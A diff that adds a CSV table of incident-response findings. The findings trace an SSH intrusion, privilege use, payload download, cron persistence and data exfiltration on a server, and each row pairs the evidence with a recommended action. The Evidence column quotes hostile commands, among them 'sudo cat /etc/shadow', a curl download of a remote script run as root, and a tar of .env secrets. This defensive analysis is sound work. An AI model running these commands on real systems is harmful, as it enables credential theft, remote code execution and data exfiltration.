@@ -1,0 +1,9 @@
+Finding ID,Timestamp,Log Source,Event,Severity,Evidence,Interpretation,Recommended Action
+F-001,2026-09-09 09:12:01,auth.log,Repeated SSH authentication failures,High,"Multiple failed logins from 203.0.113.77","Password attack or credential guessing","Block source and restrict SSH authentication"
+F-002,2026-09-09 09:19:46,auth.log,Successful SSH login after repeated failures,Critical,"Accepted password for sebastian from 203.0.113.77","Likely unauthorized account access","Reset credentials and investigate account compromise"
+F-003,2026-09-09 09:22:31,auth.log/process.log,Access to /etc/shadow,Critical,"sudo cat /etc/shadow","Credential material accessed with root privileges","Rotate credentials and restrict sudo access"
+F-004,2026-09-09 09:23:02,process.log,Remote payload download,Critical,"curl http://198.51.100.42/update.sh -o /tmp/update.sh","Malicious payload retrieved from external host","Block IOC and investigate downloaded file"
+F-005,2026-09-09 09:24:18,auth.log/process.log,Payload executed as root,Critical,"sudo bash /tmp/update.sh","Attacker executed untrusted code with root privileges","Isolate and rebuild compromised server"
+F-006,2026-09-09 09:24:19,process.log,Cron persistence created,Critical,"@reboot root /usr/local/bin/.svc","Persistence established across reboot","Remove persistence and audit scheduled tasks"
+F-007,2026-09-09 09:25:06,process.log,Sensitive application data archived,High,"tar czf /tmp/appdata.tar.gz /var/www/app/config /var/www/app/.env","Data staged for exfiltration","Rotate application secrets and review accessed data"
+F-008,2026-09-09 09:26:31,process.log/network.log,Data exfiltration,Critical,"HTTP POST of appdata.tar.gz to 198.51.100.42 with 184402 outbound bytes","Sensitive archive transferred externally","Block destination and conduct incident response"
